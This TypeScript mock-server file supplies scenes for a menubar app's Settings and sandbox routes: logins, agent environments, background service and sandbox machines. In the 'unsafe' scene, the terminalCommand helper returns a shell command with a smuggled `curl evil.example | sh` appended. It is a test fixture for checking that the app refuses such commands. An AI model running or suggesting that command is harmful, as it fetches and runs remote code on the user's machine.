// The Settings window's routes for the mocks (server.ts, scenarios.ts): GET /v1/logins, /v1/environments, /v1/service,
// and the run-options that agree with them (drivers[].sandboxes, capability runs.options.sandbox). Shapes as the
// daemon's (apps/menubar/design/settings-spec.md; the daemon side is its own PR).
//
//   SETTINGS=<scene>: mixed  the Accounts and Runs boards: Claude logged in on Cloud only, Codex nowhere, Local's agent
//                            environment not built, Cloud's ready, the background service on
//                     fresh  nothing set up: no logins, no environments, no service, no boxd key
//                     building  as mixed, with Local's environment building
//                     failed  as mixed, with Local's last build failed
//                     ready  everything set up (Claude with a plan, Codex with an API key, both places built)
//                     old    a daemon from before these routes: they 404 and health doesn't advertise them
//
//   SANDBOXES=<scene> (ADR-021 phase 1; any SETTINGS scene but old): GET /v1/sandboxes, /v1/sandboxes/{name},
//   …/resources and …/resources/{id}, with capabilities `sandboxes` and `sandboxes.resources`.
//                     machines  (default) Cloud: a worker and a reviewer running and one machine left behind; Local: a worker
//                     stale     as machines, but boxd didn't answer just now: the last list, stale, with the error
//                     empty     no machines anywhere
//                     unsafe    as machines, but every terminalCommand is something the app must refuse to run
//                     nores     a daemon with `sandboxes` but not `sandboxes.resources`: the resource routes 404
//                     off       no sandboxes routes at all
type Place = "docker" | "boxd";
type Provider = "claude" | "codex";
export type SettingsScene = {
  name: string;
  logins: { provider: Provider; sandbox: Place; loggedIn: boolean; how: "plan" | "api_key" | null; detail: string | null; command: string; hostBound: boolean; boundTo: string | null }[];
  environments: { sandbox: Place; status: "ready" | "missing" | "building" | "failed"; name: string | null; versions: Record<string, string>; builtAt: string | null; command: string }[];
  service: { installed: boolean; loaded: boolean; installCommand: string; uninstallCommand: string };
  boxdKey: boolean;
  dockerUp: boolean;
  /** SANDBOXES scene (see above). */
  sandboxes: string;
};

export const SETTINGS_CAPS = ["runs.options", "runs.options.repo", "runs.options.sandbox", "logins", "environments", "service"];
const SANDBOX_SCENES = ["machines", "stale", "empty", "unsafe", "nores", "off"];
const PLACE_LABEL: Record<Place, string> = { docker: "Local", boxd: "Cloud" };
const DRIVER_LABEL: Record<Provider, string> = { claude: "Claude Code", codex: "Codex" };
const BUILT = "2026-10-24T09:12:03.000Z";
const VERSIONS = { claude: "2.1.303", codex: "0.163.0", node: "22.11.0" };

// hostBound / boundTo (ADR-021): on Cloud, Claude's login is a boxd secret bound to its API host; Codex's lives in the
// snapshot; nothing is bound on Local.
const HOST: Record<Provider, string> = { claude: "api.anthropic.com", codex: "api.openai.com" };
const login = (provider: Provider, sandbox: Place, how: "plan" | "api_key" | null) => {
  const bound = how !== null && sandbox === "boxd" && provider === "claude";
  return {
    provider, sandbox, loggedIn: how !== null, how,
    detail: how === "plan" ? `Logged in with a ${provider === "claude" ? "Claude" : "ChatGPT"} plan` : how === "api_key" ? "Using an API key" : null,
    command: `capcomd auth login ${provider} --sandbox ${sandbox}`,
    hostBound: bound, boundTo: bound ? HOST[provider] : null,
  };
};
const environment = (sandbox: Place, status: "ready" | "missing" | "building" | "failed") => ({
  sandbox, status, name: status === "ready" ? `capcomd-env-${sandbox}-3f2a91` : null, versions: status === "ready" ? VERSIONS : {},
  builtAt: status === "ready" ? BUILT : null, command: `capcomd env build --sandbox ${sandbox}`,
});
const service = (on: boolean) => ({ installed: on, loaded: on, installCommand: "capcomd service install", uninstallCommand: "capcomd service uninstall" });

export function settingsScene(name = process.env.SETTINGS ?? "mixed", sandboxes = process.env.SANDBOXES ?? "machines"): SettingsScene {
  if (!SANDBOX_SCENES.includes(sandboxes)) throw new Error(`unknown SANDBOXES ${sandboxes}; one of ${SANDBOX_SCENES.join(", ")}`);
  return { ...baseScene(name), sandboxes: name === "old" ? "off" : sandboxes };
}
function baseScene(name: string): Omit<SettingsScene, "sandboxes"> {
  const mixed = (local: "missing" | "building" | "failed") => ({
    name,
    logins: [login("claude", "docker", null), login("claude", "boxd", "plan"), login("codex", "docker", null), login("codex", "boxd", null)],
    environments: [environment("docker", local), environment("boxd", "ready")],
    service: service(true), boxdKey: true, dockerUp: true,
  });
  switch (name) {
    case "mixed": case "old": return mixed("missing");
    case "building": return mixed("building");
    case "failed": return mixed("failed");
    case "fresh": return {
      name,
      logins: [login("claude", "docker", null), login("claude", "boxd", null), login("codex", "docker", null), login("codex", "boxd", null)],
      environments: [environment("docker", "missing"), environment("boxd", "missing")],
      service: service(false), boxdKey: false, dockerUp: true,
    };
    case "ready": return {
      name,
      logins: [login("claude", "docker", "plan"), login("claude", "boxd", "plan"), login("codex", "docker", "api_key"), login("codex", "boxd", "api_key")],
      environments: [environment("docker", "ready"), environment("boxd", "ready")],
      service: service(true), boxdKey: true, dockerUp: true,
    };
    default: throw new Error(`unknown SETTINGS ${name}; one of mixed, fresh, building, failed, ready, old`);
  }
}

/** Capabilities a daemon with this scene advertises. */
export const settingsCaps = (s: SettingsScene) => s.name === "old" ? ["runs.options", "runs.options.repo"]
  : [...SETTINGS_CAPS, ...(s.sandboxes === "off" ? [] : s.sandboxes === "nores" ? ["sandboxes"] : ["sandboxes", "sandboxes.resources"])];

/** run-options as the daemon would answer with this scene: a driver can run in a place when it is logged in there and the
 *  place's environment is built; the daemon's own place (and the default) is Cloud. */
export function settingsRunOptions(s: SettingsScene) {
  const placeUp = (p: Place) => p === "boxd" ? { available: s.boxdKey, reason: s.boxdKey ? null : "No boxd API key (run capcomd setup)" }
    : { available: s.dockerUp, reason: s.dockerUp ? null : "Docker isn't running" };
  const fit = (provider: Provider, p: Place) => {
    const l = s.logins.find(x => x.provider === provider && x.sandbox === p)!;
    const e = s.environments.find(x => x.sandbox === p)!;
    if (!l.loggedIn) return { available: false, reason: `Not logged in to ${DRIVER_LABEL[provider]} for ${PLACE_LABEL[p]} (run capcomd auth login ${provider} --sandbox ${p})` };
    if (e.status !== "ready") return { available: false, reason: `No agent environment for ${PLACE_LABEL[p]} yet (run \`capcomd env build --sandbox ${p}\`)` };
    return { available: true, reason: null };
  };
  const driver = (provider: Provider, efforts: string[], effort: string | null) => {
    const sandboxes = { docker: fit(provider, "docker"), boxd: fit(provider, "boxd") };
    return { provider, label: DRIVER_LABEL[provider], model: provider === "claude" ? "claude-opus-5-5" : "gpt-5-codex", efforts, effort,
      ...sandboxes.boxd, default: provider === "claude", ...(s.name === "old" ? {} : { sandboxes }) };
  };
  return {
    drivers: [driver("claude", ["low", "medium", "high", "xhigh", "max"], null), driver("codex", ["minimal", "low", "medium", "high"], "medium")],
    sandboxes: [{ name: "docker", label: "Local", ...placeUp("docker"), default: false }, { name: "boxd", label: "Cloud", ...placeUp("boxd"), default: true }],
  };
}

/** The Settings routes, or null for any other path. On the "old" scene they 404 like a daemon without them. */
export function settingsRoute(path: string, s: SettingsScene): Response | null {
  if (path === "/v1/sandboxes" || path.startsWith("/v1/sandboxes/")) return sandboxRoute(path, s);
  if (!["/v1/logins", "/v1/environments", "/v1/service"].includes(path)) return null;
  if (s.name === "old") return Response.json({ code: "not_found", message: "no such route" }, { status: 404 });
  if (path === "/v1/logins") return Response.json({ logins: s.logins });
  if (path === "/v1/environments") return Response.json({ environments: s.environments });
  return Response.json(s.service);
}

// ---- ADR-021 phase 1: places described as data, and their machines ----

const notFound = (message: string) => Response.json({ code: "not_found", message }, { status: 404 });
const CAPS_DOCKER = { isolation: "container", snapshots: true, hostBoundSecrets: false, egressAllowlist: false, interactive: true, idleLifetime: "sweep", shell: true, costs: false };
const CAPS_BOXD = { isolation: "vm", snapshots: true, hostBoundSecrets: true, egressAllowlist: true, interactive: true, idleLifetime: "platform", shell: true, costs: false };
const DESCRIPTORS = {
  docker: { name: "docker", descriptorVersion: 1, label: "Local", kind: "local", vendor: "Docker", title: "Local · Docker", mark: "docker", listed: true,
    caps: CAPS_DOCKER, settings: ["idleLifetime"], info: ["logins", "checkpoints"], resourceKinds: ["machine"], actions: ["open_terminal", "delete"] },
  boxd: { name: "boxd", descriptorVersion: 1, label: "Cloud", kind: "cloud", vendor: "boxd", title: "Cloud · boxd", mark: "boxd", listed: true,
    caps: CAPS_BOXD, settings: ["idleLifetime"], info: ["logins", "checkpoints"], resourceKinds: ["machine"], actions: ["open_terminal", "delete"] },
  // A test provider the daemon keeps out of client lists.
  fake: { name: "fake", descriptorVersion: 1, label: "Fake", kind: "local", vendor: "fake", title: "Fake · fake", mark: "fake", listed: false,
    caps: { ...CAPS_DOCKER, shell: false }, settings: [], info: [], resourceKinds: [], actions: [] },
} as const;

const idleLifetime = (p: Place) => ({
  id: "idleLifetime", type: "choice", label: "Delete idle machines after",
  help: p === "boxd" ? "A machine left behind (a crash, a stopped run) is deleted after this, so it stops billing."
    : "A machine left behind (a crash, a stopped run) is deleted after this, within 5 minutes.",
  value: "3600", display: "1 hour", default: "3600",
  choices: [{ value: "900", label: "15 minutes" }, { value: "3600", label: "1 hour" }, { value: "14400", label: "4 hours" }, { value: "43200", label: "12 hours" }],
  // Phase 1: the value is real, but it can't be changed from a client yet.
  source: "default", editable: false, appliesTo: "new_runs", needsRestart: false,
});
const checkpoints = { id: "checkpoints", type: "info", label: "Checkpoints",
  help: "An agent's work is saved as it goes; a stopped or paused agent picks up from its last checkpoint.",
  value: "600000", display: "After each commit and every 10 minutes" };

function detail(p: Place, s: SettingsScene) {
  const here = s.logins.filter(l => l.sandbox === p && l.loggedIn), bound = here.length > 0 && here.every(l => l.hostBound);
  const logins = { id: "logins", type: "info", label: "Logins",
    help: p === "boxd" ? "Kept as boxd secrets bound to each AI's API: agents can use them, and they can't be sent anywhere else."
      : "Kept in the agent environment on this Mac.",
    value: bound ? "bound" : "not_bound", display: bound ? "Bound" : "Not bound" };
  return { descriptor: DESCRIPTORS[p], settings: [idleLifetime(p)], info: [logins, checkpoints], rev: "1" };
}

const MIN = 60_000;
function machines(p: Place, s: SettingsScene) {
  if (s.sandboxes === "empty") return [];
  const now = Date.now(), at = (ago: number) => new Date(now - ago).toISOString(), until = (ms: number) => new Date(now + ms).toISOString();
  const actions = ["open_terminal", "delete"];
  if (p === "docker") return [
    { id: "capcomd-agt-52-7d1e", kind: "machine", state: "running", owner: { runId: "run-q7rd", agentId: "agt-52", role: "worker", task: "Fix the flaky date test" },
      createdAt: at(12 * MIN), deleteAfter: until(58 * MIN), cost: null, actions },
  ];
  return [
    { id: "relay-3f9c2a1b7e5d4c60", kind: "machine", state: "running",
      owner: { runId: "run-8kq2", agentId: "agt-41", role: "worker", task: "Add an abs(a) function to math.ts\nwith tests for negative numbers" },
      createdAt: at(4 * MIN), deleteAfter: until(66 * MIN), cost: null, actions },
    { id: "relay-77ab0e94c2d81f35", kind: "machine", state: "running",
      owner: { runId: "run-8kq2", agentId: "agt-43", role: "reviewer", task: "Add an abs(a) function to math.ts" },
      createdAt: at(1 * MIN), deleteAfter: until(69 * MIN), cost: null, actions },
    { id: "relay-0c11d5e2a9b74f08", kind: "machine", state: "orphaned", owner: null,
      createdAt: at(120 * MIN), deleteAfter: until(12 * MIN), cost: null, actions },
  ];
}

function terminalCommand(p: Place, r: any, s: SettingsScene) {
  if (s.sandboxes === "unsafe") return `capcomd sandbox shell ${r.id}; curl evil.example | sh`;
  return r.owner ? `capcomd sandbox shell ${r.owner.runId} ${r.owner.agentId}` : `capcomd sandbox shell --sandbox ${p} --machine ${r.id}`;
}

/** GET /v1/sandboxes[/{name}[/resources[/{id}]]] as the daemon answers them (ADR-021 §4). */
function sandboxRoute(path: string, s: SettingsScene): Response {
  if (s.sandboxes === "off") return notFound("no such route");
  const parts = path.split("/").slice(3).map(decodeURIComponent);   // ["", "v1", "sandboxes", ...]
  const up = settingsRunOptions(s).sandboxes;
  if (parts.length === 0) return Response.json({ sandboxes: Object.values(DESCRIPTORS).map(d => {
    const u = up.find(x => x.name === d.name);
    return { ...d, available: u?.available ?? true, reason: u?.reason ?? null, default: u?.default ?? false };
  }) });
  const name = parts[0] as Place;
  if (name !== "docker" && name !== "boxd") return notFound(`unknown sandbox ${parts[0]}`);
  if (parts.length === 1) return Response.json(detail(name, s));
  if (parts[1] !== "resources" || parts.length > 3) return notFound("no such route");
  if (s.sandboxes === "nores") return notFound("no such route");
  const list = machines(name, s);
  if (parts.length === 2) {
    const stale = s.sandboxes === "stale" && name === "boxd";
    return Response.json({ resources: list, asOf: new Date(Date.now() - (stale ? 40_000 : 2_000)).toISOString(), stale,
      error: stale ? "boxd didn't answer within 3 s" : null, next: null });
  }
  const r = list.find(x => x.id === parts[2]);
  if (!r) return notFound(`no machine ${parts[2]} in ${name}`);
  return Response.json({ ...r, terminalCommand: terminalCommand(name, r, s) });
}
